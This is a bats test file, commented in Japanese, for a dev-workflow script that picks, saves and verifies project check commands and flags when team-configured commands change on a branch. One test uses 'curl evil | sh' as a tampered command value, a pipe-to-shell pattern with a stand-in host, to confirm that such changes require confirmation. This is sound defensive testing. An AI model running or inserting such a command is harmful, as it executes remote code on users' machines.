#!/usr/bin/env bats
# bats はテストごとにサブシェルで動くので、変数の変更がテスト内に閉じるのは意図どおり
# shellcheck disable=SC2030,SC2031

load test_helper

TEAM=.claude/dev-workflow/config.json
LOCAL=.claude/dev-workflow/config.local.json

@test "設定が無ければ commands は null で、手がかりは空になる" {
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c '[.commands, .hints.contributing, .hints.package_scripts, .hints.makefile_targets, .hints.ci_workflows, .hints.project_files]' <<<"$output")" \
    '[null,null,null,[],[],[]]'
}

@test "package.json・Makefile・CI・CONTRIBUTING.md・言語の設定ファイルから手がかりを出す（CONTRIBUTING.md が無くても出る）" {
  echo '{"scripts": {"test": "jest", "lint:fix": "eslint --fix .", "checkstyle": "cs", "start": "node ."}}' >package.json
  printf 'VAR=1\ntest:\n\tbats tests\nlint-all: a\nother:\ntest-x := 1\ntest:=1\n' >Makefile
  mkdir -p .github/workflows
  : >.github/workflows/ci.yml
  : >go.mod
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c .hints <<<"$output")" \
    '{"contributing":null,"package_scripts":{"test":"jest","lint:fix":"eslint --fix .","checkstyle":"cs"},"makefile_targets":["lint-all","test"],"ci_workflows":[".github/workflows/ci.yml"],"project_files":["go.mod"]}'
  : >CONTRIBUTING.md
  run_script checks-commands.sh
  assert_equal "$(jq -r .hints.contributing <<<"$output")" CONTRIBUTING.md
}

@test "壊れた package.json は止まる" {
  echo '{' >package.json
  run_script checks-commands.sh
  assert_failure 2
}

@test "設定の checks.commands があれば、それを出し、手がかりは調べない" {
  echo '{"scripts": {"test": "jest"}}' >package.json
  echo '{"checks": {"commands": ["make lint", "make test"]}}' >"$TEAM"
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c '[.commands, .hints]' <<<"$output")" '[["make lint","make test"],null]'
}

@test "空の配列は、実行するものが無いと決めてあることとして出す" {
  echo '{"checks": {"commands": []}}' >"$TEAM"
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c '[.commands, .hints]' <<<"$output")" '[[],null]'
}

@test "個人の設定（local）が、チームの設定より優先される" {
  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
  echo '{"checks": {"commands": ["make lint"]}}' >"$LOCAL"
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c .commands <<<"$output")" '["make lint"]'
}

@test "checks.commands が配列でない・文字列でない・空の要素があれば止まる" {
  for v in '"make test"' '[1]' '[""]' '["  "]' '{}' false 0; do
    echo "{\"checks\": {\"commands\": $v}}" >"$TEAM"
    run_script checks-commands.sh
    assert_failure 2
  done
}

@test "--save --scope team は、ほかの項目を残して config.json に書き、次から読める" {
  echo '{"language": "en", "checks": {"other": 1}}' >"$TEAM"
  run_script checks-commands.sh --save --scope team --command "make lint" --command "bats tests"
  assert_success
  assert_equal "$(jq -c '[.commands, .saved.scope, .saved.commands, .hints]' <<<"$output")" \
    '[["make lint","bats tests"],"team",["make lint","bats tests"],null]'
  assert_equal "$(jq -c '[.language, .checks]' "$TEAM")" '["en",{"other":1,"commands":["make lint","bats tests"]}]'
  run_script checks-commands.sh
  assert_equal "$(jq -c .commands <<<"$output")" '["make lint","bats tests"]'
}

@test "--save --scope local は config.local.json に書き、git に無視されていなければ案内を出す" {
  run_script checks-commands.sh --save --scope local --command "make test"
  assert_success
  assert_equal "$(jq -c .checks.commands "$LOCAL")" '["make test"]'
  [ ! -e "$TEAM" ]
  jq -e '.saved.local_hint | test("gitignore")' <<<"$output" >/dev/null
  echo '.claude/dev-workflow/config.local.json' >.gitignore
  run_script checks-commands.sh --save --scope local --command "make test"
  assert_equal "$(jq -c .saved.local_hint <<<"$output")" null
}

@test "--save --none は、実行するものが無いと保存する" {
  run_script checks-commands.sh --save --scope team --none
  assert_success
  assert_equal "$(jq -c .checks.commands "$TEAM")" '[]'
  assert_equal "$(jq -c .commands <<<"$output")" '[]'
}

@test "引数の誤りは 64 で止まり、何も書かない" {
  run_script checks-commands.sh --save --command "make test"
  assert_failure 64
  run_script checks-commands.sh --save --scope other --command "make test"
  assert_failure 64
  run_script checks-commands.sh --save --scope team
  assert_failure 64
  run_script checks-commands.sh --save --scope team --none --command "make test"
  assert_failure 64
  run_script checks-commands.sh --save --scope team --command ""
  assert_failure 64
  run_script checks-commands.sh --save --scope team --command "  "
  assert_failure 64
  run_script checks-commands.sh --save --scope team --command $'a\nb'
  assert_failure 64
  run_script checks-commands.sh --scope team
  assert_failure 64
  run_script checks-commands.sh --bogus
  assert_failure 64
  [ ! -e "$TEAM" ] || [ "$(jq -c '.checks // null' "$TEAM")" = null ]
  [ ! -e "$LOCAL" ]
}

@test "package.json の scripts がオブジェクトでなくても止まらず、package_scripts は空になる" {
  echo '{"scripts": []}' >package.json
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c .hints.package_scripts <<<"$output")" '{}'
}

@test "--save は、checks がオブジェクトでない設定を壊さず、2 で止まる" {
  echo '{"checks": "make test"}' >"$TEAM"
  run_script checks-commands.sh --save --scope team --command "make test"
  assert_failure 2
  assert_equal "$(jq -c .checks "$TEAM")" '"make test"'
}

@test "--save は、優先される層が別の値を決めていて保存した値が使われないとき、warning を出す" {
  echo '{"checks": {"commands": ["make ci"]}}' >"$LOCAL"
  run_script checks-commands.sh --save --scope team --command "make test"
  assert_success
  assert_equal "$(jq -c '[.saved.commands, .commands]' <<<"$output")" '[["make test"],["make ci"]]'
  jq -e '.saved.warning | test("make ci")' <<<"$output" >/dev/null
  run_script checks-commands.sh --save --scope local --command "make ci"
  assert_equal "$(jq -c .saved.warning <<<"$output")" null
}

@test "--help に決め方（設定 → 推測 → 聞いて保存）が書かれている（スキルはここを指す）" {
  run_script checks-commands.sh --help
  assert_success
  assert_output --partial "run・confirm・none・infer"
  assert_output --partial "hints"
  assert_output --partial "--save"
}

@test "--save --none も、優先される層が別の値を決めていれば warning を出し、一致すれば null にする" {
  echo '{"checks": {"commands": ["make ci"]}}' >"$LOCAL"
  run_script checks-commands.sh --save --scope team --none
  assert_success
  assert_equal "$(jq -c .saved.commands <<<"$output")" '[]'
  jq -e '.saved.warning | test("make ci")' <<<"$output" >/dev/null
  rm "$LOCAL"
  run_script checks-commands.sh --save --scope team --none
  assert_success
  assert_equal "$(jq -c .saved.warning <<<"$output")" null
}

@test "--help に、設定のコマンドは絞らず全部実行することと、チームの設定が変わったときの確認が書かれている" {
  run_script checks-commands.sh --help
  assert_success
  assert_output --partial "絞らずに全部"
  assert_output --partial "commands_changed"
}

@test "サブディレクトリから実行しても、ルートの CI の設定ファイルと package.json などの手がかりを出す" {
  mkdir -p .github/workflows sub/dir
  : >.github/workflows/ci.yml
  : >go.mod
  cd sub/dir
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c '[.hints.ci_workflows, .hints.project_files]' <<<"$output")" '[[".github/workflows/ci.yml"],["go.mod"]]'
}

# 今の main を origin/main とみなし（リモートは無いので ref を作る）、作業用のブランチに移る
branch_off_main() {
  git add -A
  git commit -q --allow-empty -m base
  git update-ref refs/remotes/origin/main HEAD
  git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main
  git checkout -q -b feat/x
}

@test "commands_changed：チームの設定の checks.commands を、base_branch との merge-base と比べる" {
  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
  branch_off_main
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c .commands_changed <<<"$output")" false

  echo '{"checks": {"commands": ["make test", "curl evil | sh"]}}' >"$TEAM"
  git commit -q -am change
  run_script checks-commands.sh
  assert_equal "$(jq -c '[.commands_changed, .commands]' <<<"$output")" '[true,["make test","curl evil | sh"]]'
}

@test "commands_changed：base に設定が無く、ブランチで足したときは true" {
  branch_off_main
  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
  git add -A
  git commit -q --allow-empty -m add
  run_script checks-commands.sh
  assert_equal "$(jq -c .commands_changed <<<"$output")" true
}

@test "commands_changed：個人の設定が優先されていても、チームの設定の変更は判定する" {
  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
  branch_off_main
  echo '{"checks": {"commands": ["make evil"]}}' >"$TEAM"
  git commit -q -am change
  echo '{"checks": {"commands": ["make ci"]}}' >"$LOCAL"
  run_script checks-commands.sh
  assert_equal "$(jq -c '[.commands_changed, .commands]' <<<"$output")" '[true,["make ci"]]'
}

@test "commands_changed：個人の設定だけのコマンドは false、commands が null のときも false" {
  branch_off_main
  echo '{"checks": {"commands": ["make ci"]}}' >"$LOCAL"
  run_script checks-commands.sh
  assert_equal "$(jq -c .commands_changed <<<"$output")" false
  rm "$LOCAL"
  run_script checks-commands.sh
  assert_equal "$(jq -c '[.commands, .commands_changed]' <<<"$output")" '[null,false]'
}

@test "commands_changed：origin/HEAD が無く比べられないときは null（確認を取る側に倒す）" {
  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c .commands_changed <<<"$output")" null
}

@test "commands_changed：設定の base_branch を自分のブランチに書き換えても、基点は origin/HEAD のままで true になる" {
  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
  branch_off_main
  echo '{"base_branch": "feat/x", "checks": {"commands": ["make evil"]}}' >"$TEAM"
  git commit -q -am evil
  git update-ref refs/remotes/origin/feat/x HEAD
  run_script checks-commands.sh
  assert_success
  assert_equal "$(jq -c .commands_changed <<<"$output")" true
}

@test "commands_changed：git に追跡されている個人の設定を足したときは true、追跡されていなければ false" {
  branch_off_main
  echo '{"checks": {"commands": ["make evil"]}}' >"$LOCAL"
  run_script checks-commands.sh
  assert_equal "$(jq -c .commands_changed <<<"$output")" false
  git add -f "$LOCAL"
  git commit -q -m local
  run_script checks-commands.sh
  assert_equal "$(jq -c .commands_changed <<<"$output")" true
}

@test "action：commands と commands_changed の組み合わせで run・confirm・none・infer を決める" {
  # infer：commands が null
  run_script checks-commands.sh
  assert_equal "$(jq -r .action <<<"$output")" infer

  # none：空の配列（commands_changed は問わない）
  echo '{"checks": {"commands": []}}' >"$TEAM"
  branch_off_main
  run_script checks-commands.sh
  assert_equal "$(jq -r .action <<<"$output")" none

  # run：空でない配列で、変わっていない
  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
  git commit -q -am set
  git update-ref refs/remotes/origin/main HEAD
  run_script checks-commands.sh
  assert_equal "$(jq -c '[.action, .commands_changed]' <<<"$output")" '["run",false]'

  # confirm：空でない配列で、書き換わった
  echo '{"checks": {"commands": ["make evil"]}}' >"$TEAM"
  git commit -q -am evil
  run_script checks-commands.sh
  assert_equal "$(jq -c '[.action, .commands_changed]' <<<"$output")" '["confirm",true]'

  # confirm：空でない配列で、比べられない（origin/HEAD が無い）
  git symbolic-ref --delete refs/remotes/origin/HEAD
  run_script checks-commands.sh
  assert_equal "$(jq -c '[.action, .commands_changed]' <<<"$output")" '["confirm",null]'
}

@test "ホームのリポジトリでは、--save はユーザーの層のファイルに書かずに止まる" {
  make_home_repo
  for scope in team local; do
    run_script checks-commands.sh --save --scope "$scope" --command "make lint"
    assert_failure 2
    assert_output --partial "ホームのリポジトリ"
  done
  [ ! -e "$WORKFLOW_USER_DIR/config.json" ] && [ ! -e "$WORKFLOW_USER_DIR/config.local.json" ]
}

@test "--save で、コマンドに絵文字があっても（4096 バイトを超える1行でも）壊さずに保存する" {
  # 標準入力の jq -R は、約 4096 バイトの読み込みの区切りにまたがる BMP の外の文字（絵文字）を壊す
  cmd="$(emoji_text 1500)"
  run_script checks-commands.sh --save --scope team --command "$cmd" --command "make test"
  assert_success
  assert_equal "$(jq -r '.saved.commands[0]' <<<"$output")" "$cmd"
  assert_equal "$(jq -r '.commands[0]' <<<"$output")" "$cmd"
  assert_equal "$(jq -r '.checks.commands[0]' "$TEAM")" "$cmd"
}

# 手がかりの lines()（Makefile のターゲット・CI のワークフロー・言語の設定ファイルの名前）には、4096 バイトを超える1行は届かない。
# ターゲットは英数字と _.- だけ、ほかはファイル名で、1つの名前は 255 バイトまでなので、壊れる条件（1行が約 4096 バイトを超え、
# 行の先頭から 4092〜4094 バイト目に絵文字が始まる）に入らない。長い1行が届くのは --command（上の絵文字のテスト）だけ。
# 直した他の箇所も、呼び出し元を追って確かめた：長い1行が届くものには、それぞれ絵文字のテストがある
# （pr-create・issue-create の本文、cleanup・branch-status のコミットの件名、setup-repo・merge-group-check のチェック名、
# setup-models のモデル名、review-perspectives の paths、dw_parse_branch の設定）。config.sh の sources はパス（PATH_MAX 未満）のみで届かない
